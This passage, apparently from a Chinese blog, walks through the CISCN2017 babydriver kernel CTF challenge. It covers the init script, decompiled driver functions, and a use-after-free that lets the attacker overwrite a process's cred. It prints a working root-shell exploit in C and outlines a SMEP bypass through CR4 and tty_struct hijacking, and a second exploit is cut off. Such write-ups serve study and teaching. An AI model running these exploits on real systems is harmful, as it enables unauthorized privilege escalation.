<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep <span class="string">&#x27;^flags.*(vmx|svm)&#x27;</span> /proc/cpuinfo </span><br></pre></td></tr></table></figure>
<p>如果输出 NULL 则代表不支持，具体的解决措施网上都有</p>
<p>然后用如下命令解压 rootfs.cpio：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv ../rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip ./rootfs.cpio.gz </span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这个 rootfs.cpio 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
</ul>
<p>用如下命令进行提取：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio </span><br></pre></td></tr></table></figure>
<p>先看看 init：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver cat init                            </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc # mount:挂载</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag # 设置文件所有者和文件关联组(只有root权限才能拿flag)</span><br><span class="line">chmod 400 flag </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 尖括号可以将数据从一个地方转移到另一个地方</span></span><br><span class="line">exec 0&lt;/dev/console # 将/dev/console设备,重定向为标准输入</span><br><span class="line">exec 1&gt;/dev/console # 将标准输出,重定向为/dev/console设备</span><br><span class="line">exec 2&gt;/dev/console # 将标准错误,重定向为/dev/console设备</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko # 添加了babydriver.ko驱动(可能有洞)</span><br><span class="line">chmod 777 /dev/babydev # babydev全权限</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot; # 打印一句话</span><br><span class="line">setsid cttyhack setuidgid 1000 sh # 设置用户ID(和权限相关)</span><br><span class="line"></span><br><span class="line">umount /proc # umount:取消挂载</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 babydev 是人为添加的一个文件，可以把它认为是一个虚拟外设（有点类似于键盘缓冲区之类的东西）</li>
</ul>
<p>一般 kernel pwn 都会在驱动函数那里设置漏洞，把它拿出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver checksec babydriver.ko </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/CISCN2017_babydriver/babydriver/babydriver.ko&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>用IDA分析 babydriver.ko：</p>
<img src="/2022/05/17/kernel%20UAF/1652785739175-1653066925237.png" class width="1652785739175"> 
<ul>
<li>和上一个 kernel pwn 不同，这个 IDA 分析的还是很清楚的，原因就在于它没有去除符号表</li>
</ul>
<p>init_module：初始化模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &lt; <span class="number">0</span> ) <span class="comment">// 向内核申请设备号</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13alloc_chrdev_region failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;cdev, &amp;fops); <span class="comment">// 初始化cdev结构体变量</span></span><br><span class="line">  qword_D60 = (__int64)&amp;_this_module;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)cdev_add(&amp;cdev, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>) &gt;= <span class="number">0</span> ) <span class="comment">// 向Linux内核系统中添加一个新的cdev结构体变量所描述的字符设备</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = _class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no); <span class="comment">// 创建一个设备类(有面向对象的味道)</span></span><br><span class="line">    babydev_class = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( device_create(v0, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>) ) <span class="comment">// 创建对应的设备</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      printk(<span class="string">&quot;13create device failed&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      class_destroy(babydev_class); <span class="comment">// 删除对应的设备</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">&quot;13create class failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_del(&amp;cdev); <span class="comment">// 用于从Linux内核系统中移除cdev结构体变量所描述的字符设备</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13cdev init failed\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  unregister_chrdev_region((<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>); <span class="comment">// 释放原先申请的设备号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>值得注意的是：该程序把“驱动函数”和“babydev”进行了绑定（申请了一个名为“babydev”的设备，该驱动文件 babydriver.ko 就是为设备“babydev”为生的）</li>
</ul>
<p>babyioctl：定义驱动函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 size; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, command); <span class="comment">// 这里的fp是&quot;文件指针&quot;(fd是文件描述符)</span></span><br><span class="line">  size = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(size, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = size;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义了 0x10001 的命令：释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len </li>
</ul>
<p>babyopen：打开文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一块 64 字节的空间，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len </li>
</ul>
<p>babyread：读文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyread</span><span class="params">(FILE *fp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, buf);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; size )</span><br><span class="line">      copy_to_user(buf, babydev_struct.device_buf, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先检查 babydev_struct.device_buf 中是否有数据</li>
<li>再检查用户申请的长度 size 是否大于 babydev_struct.device_buf</li>
<li>然后调用 copy_to_user 把内核数据 babydev_struct.device_buf 拷贝到用户缓冲区 buf</li>
</ul>
<p>babywrite：写文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babywrite</span><span class="params">(FILE *fp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, buf);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; size )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buf, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先检查 babydev_struct.device_buf 中是否有数据</li>
<li>再检查用户申请的长度 size 是否大于 babydev_struct.device_buf</li>
<li>然后调用 copy_from_user 把用户缓冲区 buf 拷贝到内核数据 babydev_struct.device_buf</li>
</ul>
<p>babyrelease：关闭文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放空间 </li>
</ul>
<p><strong>入侵思路</strong></p>
<p>存在一个 <strong>伪条件竞争引发的UAF漏洞</strong>，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间（因为 <code>babydev_struct</code> 是全局的），也就是说，两个设备共用了一个 <code>babydev_struct</code></p>
<p>如果这时释放第一个，那么第二个其实是被释放过的，这样就造成了一个UAF，我们可以通过UAF修改 <code>cred</code> 结构体来提权</p>
<p>那么根据 UAF 的思想，入侵步骤如下：</p>
<ul>
<li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li>
<li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li>
<li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li>
</ul>
<p>注意：fork() 在创建新进程时，会先 kmalloc 一个内存空间用于存放新进程的 cred，这时就会申请到我们可以控制的那片内存，从而修改 cred</p>
<p>分析官方exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc exp.c -static -masm=intel -g -o exp */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;stropts.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// 修改babydev_struct.device_buf_len为sizeof(cred)</span></span><br><span class="line">    close(fd1); <span class="comment">// 释放fd1</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork(); <span class="comment">// 新起进程的cred空间,会被申请到babydev_struct中</span></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改fd2(操控babydev_struct),修改新进程的cred的uid,gid等值为&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据驱动函数：对文件描述符FD进行操作，就是直接控制“babydev_struct”，进而间接控制“cred”</li>
</ul>
<p><strong>bypass-smep</strong></p>
<p>本题目还有另一种做法：绕过 smep 来实现 ret2usr（smep：当 CPU 处于 <code>ring0</code> 模式时，执行用户空间的代码会触发页错误）</p>
<ul>
<li>系统根据 CR4 寄存器的值判断是否开启 smep 保护 </li>
<li>smep 开启：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = <span class="number">0x1407f0</span> = <span class="number">10100</span> <span class="number">0000</span> <span class="number">0111</span> <span class="number">1111</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>smep 关闭：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = <span class="number">0x1407e0</span> = <span class="number">10100</span> <span class="number">0000</span> <span class="number">0111</span> <span class="number">1110</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>而 CR4 寄存器是可以通过 mov 指令修改的：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, <span class="number">0x1407e0</span></span><br></pre></td></tr></table></figure>
<p>先用 extract-vmlinux 获取 vmlinux：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<p>然后使用 Ropper 来寻找 gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver time ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1  <span class="number">234.87</span>s user <span class="number">32.60</span>s system <span class="number">139</span>% cpu <span class="number">3</span>:<span class="number">11.53</span> total</span><br></pre></td></tr></table></figure>
<p>先写一个脚本来查找“commit_creds”和“prepare_kernel_cred”（没有开 PIE 和 Kaslr）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	find_symbols();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ $ /tmp/find </span><br><span class="line">commit_creds addr: <span class="number">0xffffffff810a1420</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffff810a1810</span></span><br></pre></td></tr></table></figure>
<p>接下来就说一下攻击的原理：</p>
<ul>
<li>先通过 uaf 控制一个 <code>tty_struct</code> 结构（在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配）</li>
<li><code>tty_struct-&gt;tty_operations</code> 中有许多函数指针可以用来劫持</li>
<li>进行 stack pivot（栈迁移）到 rop 链的空间</li>
</ul>
<p>官方exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 